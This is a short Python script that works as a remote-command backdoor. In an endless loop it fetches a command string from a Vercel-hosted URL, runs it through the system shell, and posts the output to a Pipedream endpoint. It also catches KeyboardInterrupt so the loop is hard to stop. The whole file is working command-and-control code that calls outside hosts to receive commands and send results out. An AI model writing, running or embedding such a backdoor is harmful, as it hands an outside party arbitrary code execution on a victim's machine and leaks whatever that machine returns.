try:
    from requests import get, post
    from time import sleep
    from subprocess import check_output as system

    old_command = ""
    command = ""
except KeyboardInterrupt:
    pass

while True:
    # prevent keyboardinterrupt
    try:
        #get HTML
        try:
            command = get("https://discord-bot-command-inputter-littleblack111.vercel.app").content.decode()
            if "error" in command.lower():
                sleep(5)
                continue
        except KeyboardInterrupt:
            continue
        except:
            print("Failed to connect to server")
            continue
            # execute command
        if old_command != command:
            try:
                cmdout = system(command, shell=True)
                if cmdout != "":
                    try:
                        post("https://eo482aoknyxae8c.m.pipedream.net/", data=cmdout)
                    except KeyboardInterrupt:
                        continue
                    except:
                        print("Failed to sent output")
                        continue
                old_command = command
                continue
            except:
                continue
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            continue
    except KeyboardInterrupt:
        continue
